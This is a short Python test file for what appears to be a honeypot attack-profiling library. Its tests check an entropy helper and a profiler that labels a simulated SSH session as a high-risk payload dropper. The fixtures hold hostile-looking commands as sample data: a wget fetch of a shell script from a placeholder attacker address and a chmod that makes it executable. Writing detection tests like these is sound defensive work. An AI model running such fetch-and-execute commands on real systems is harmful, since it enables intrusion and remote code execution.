from datetime import timedelta

from sentinelmesh.models import AttackSession, ObservedCommand, utc_now
from sentinelmesh.profiler import AttackProfiler, shannon_entropy


def test_shannon_entropy_returns_positive_value():
    assert shannon_entropy(["wget payload.sh", "chmod +x payload.sh"]) > 0


def test_attack_profiler_builds_high_risk_profile():
    started = utc_now()
    session = AttackSession(
        session_id="abc",
        service="ssh",
        remote_ip="203.0.113.25",
        remote_port=44332,
        local_port=2222,
        started_at=started,
        ended_at=started + timedelta(seconds=2),
        message_samples=["SSH-2.0-OpenSSH_9.6"],
        command_history=["wget http://198.51.100.7/payload.sh", "chmod +x payload.sh"],
    )
    commands = [
        ObservedCommand("abc", "wget http://198.51.100.7/payload.sh", started),
        ObservedCommand("abc", "chmod +x payload.sh", started + timedelta(milliseconds=350)),
    ]

    profile = AttackProfiler().build_profile(session, commands)

    assert profile.tool_guess == "payload-dropper"
    assert profile.risk_score >= 40
    assert "download-attempt" in profile.labels
